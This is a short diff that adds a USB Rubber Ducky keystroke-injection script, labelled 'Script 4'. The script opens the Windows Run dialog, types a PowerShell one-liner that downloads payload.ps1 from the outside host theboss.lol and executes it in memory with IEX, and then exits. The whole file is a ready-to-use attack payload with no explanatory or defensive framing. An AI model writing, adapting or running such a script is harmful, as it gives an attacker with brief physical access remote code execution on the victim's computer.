@@ -1,0 +1,9 @@
+REM Script 4:
+REM =========
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell "IEX (New-Object Net.WebClient).DownloadString('http://theboss.lol/payload.ps1');"
+ENTER
+STRING exit
+ENTER
